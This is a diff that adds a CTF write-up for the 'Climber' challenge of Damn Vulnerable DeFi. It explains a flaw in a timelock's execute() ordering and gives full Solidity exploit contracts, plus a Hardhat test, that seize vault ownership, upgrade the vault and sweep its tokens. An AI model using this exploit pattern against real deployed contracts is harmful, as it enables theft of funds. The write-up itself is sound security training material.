@@ -196,7 +196,156 @@ contract WalletRegistryAttacker {
 
 ### 12. Climber
 
-TODO.
+This challenge is a combination of UUPS upgradeable pattern and timelocks. It consists of two parts:
+1. A vault contract employing the UUPS upgradeable pattern, which holds tokens. Our aim here is to drain these tokens.
+2. A timelock that acts as the owner of the vault.
+
+Upon reviewing the contract code, it becomes apparent that our primary objective is to gain control of the timevault. Once in control, we can transfer the vault's ownership to ourselves and subsequently upgrade the vault code to a version that allows us to drain the tokens.
+
+A notable vulnerability lies in the `execute()` function of the timelock contract. This function lacks ownership checks, meaning anyone can call `execute()`. More critically, it processes the input calldata before verifying the operation's state. This flaw provides an opening for our exploit: we can manipulate the timelock to execute some code and circumvent the `getOperationState(id) != OperationState.ReadyForExecution` check. 
+
+`ClimberTimelock.sol` code:
+```sol
+    /**
+     * Anyone can execute what's been scheduled via `schedule`
+     */
+    function execute(address[] calldata targets, uint256[] calldata values, bytes[] calldata dataElements, bytes32 salt)
+        external
+        payable
+    {
+        if (targets.length <= MIN_TARGETS) {
+            revert InvalidTargetsCount();
+        }
+
+        if (targets.length != values.length) {
+            revert InvalidValuesCount();
+        }
+
+        if (targets.length != dataElements.length) {
+            revert InvalidDataElementsCount();
+        }
+
+        bytes32 id = getOperationId(targets, values, dataElements, salt);
+
+        for (uint8 i = 0; i < targets.length;) {
+            targets[i].functionCallWithValue(dataElements[i], values[i]);
+            unchecked {
+                ++i;
+            }
+        }
+
+        if (getOperationState(id) != OperationState.ReadyForExecution) {
+            revert NotReadyForExecution(id);
+        }
+
+        operations[id].executed = true;
+    }
+```
+
+`ClimberTimelockBase.sol` code:
+```sol
+    function getOperationState(bytes32 id) public view returns (OperationState state) {
+        Operation memory op = operations[id];
+
+        if (op.known) {
+            if (op.executed) {
+                state = OperationState.Executed;
+            } else if (block.timestamp < op.readyAtTimestamp) {
+                state = OperationState.Scheduled;
+            } else {
+                state = OperationState.ReadyForExecution;
+            }
+        } else {
+            state = OperationState.Unknown;
+        }
+    }
+```
+
+We can manipulate the `ClimberTimelock` to execute any operation by scheduling it post-execution. This approach enables us to ultimately transfer the ownership of `ClimberVault` to ourselves, thereby successfully completing the challenge.
+
+Exploit contract:
+```sol
+contract ClimberAttacker {
+
+    ClimberVault vault;
+    DamnValuableToken token;
+    ClimberTimelock timeclock;
+
+    address[] targets = new address[](4);
+    uint256[] values = new uint256[](4);
+    bytes[] dataElements = new bytes[](4);
+
+    constructor(address _vaultAddress, address _tokenAddress) {
+        vault = ClimberVault(_vaultAddress);
+        token = DamnValuableToken(_tokenAddress);
+        timeclock = ClimberTimelock(payable(vault.owner()));
+    }
+
+    function attack() public {
+        targets[0] = address(timeclock);
+        values[0] = 0;
+        dataElements[0] = abi.encodeWithSignature("updateDelay(uint64)", 0);
+
+        targets[1] = address(vault);
+        values[1] = 0;
+        dataElements[1] = abi.encodeWithSignature("transferOwnership(address)", msg.sender);
+
+        targets[2] = address(timeclock);
+        values[2] = 0;
+        // We cannot use `_setupRole` here because it is a external function call (even though the contract is calling itself).
+        dataElements[2] = abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this));
+
+        targets[3] = address(this);
+        values[3] = 0;
+        dataElements[3] = abi.encodeWithSignature("timelockSchedule()");
+
+        timeclock.execute(targets, values, dataElements, 0);
+    }
+
+    function timelockSchedule() public {
+        timeclock.schedule(targets, values, dataElements, 0);
+    }
+}
+
+// Upgrade original contract to this one so we can sweep the funds.
+contract ClimberVaultAttacker is Initializable, OwnableUpgradeable, UUPSUpgradeable {
+    uint256 private _lastWithdrawalTimestamp;
+    address private _sweeper;
+
+    /// @custom:oz-upgrades-unsafe-allow constructor
+    constructor() {
+        _disableInitializers();
+    }
+
+    // Sweep funds.
+    function sweepFunds(address token) external {
+        SafeTransferLib.safeTransfer(token, msg.sender, IERC20(token).balanceOf(address(this)));
+    }
+
+    // By marking this internal function with `onlyOwner`, we only allow the owner account to authorize an upgrade
+    function _authorizeUpgrade(address newImplementation) internal override onlyOwner {}
+}
+
+```
+
+It's also important to note that the challenge's code utilizes [Hardhat UUPS Upgradeable APIs](https://docs.openzeppelin.com/upgrades-plugins/1.x/api-hardhat-upgrades#deploy-proxy) for setting up the context. To understand how to execute a UUPS upgrade, we can refer to the documentation provided by Hardhat on this topic.
+
+```js
+    it('Execution', async function () {
+        // 1. Exploit `ClimberTimelock` to set vault owner to player.
+        const attacker = await (await ethers.getContractFactory('ClimberAttacker', player)).deploy(
+            vault.address,
+            token.address
+        );
+        await attacker.attack();
+        expect(await vault.owner()).to.eq(player.address);
+
+        // 2. Upgrade original `ClimberVault` to `ClimberVault` where we can easily sweep all the tokens.
+        const climberVaultAttackerFactory = await ethers.getContractFactory("ClimberVaultAttacker", attacker);
+        const climberVaultAttacker = await upgrades.upgradeProxy(vault.address, climberVaultAttackerFactory);
+        await climberVaultAttacker.connect(player).sweepFunds(token.address);
+    });
+```
 
 ### 13. Wallet Mining
 
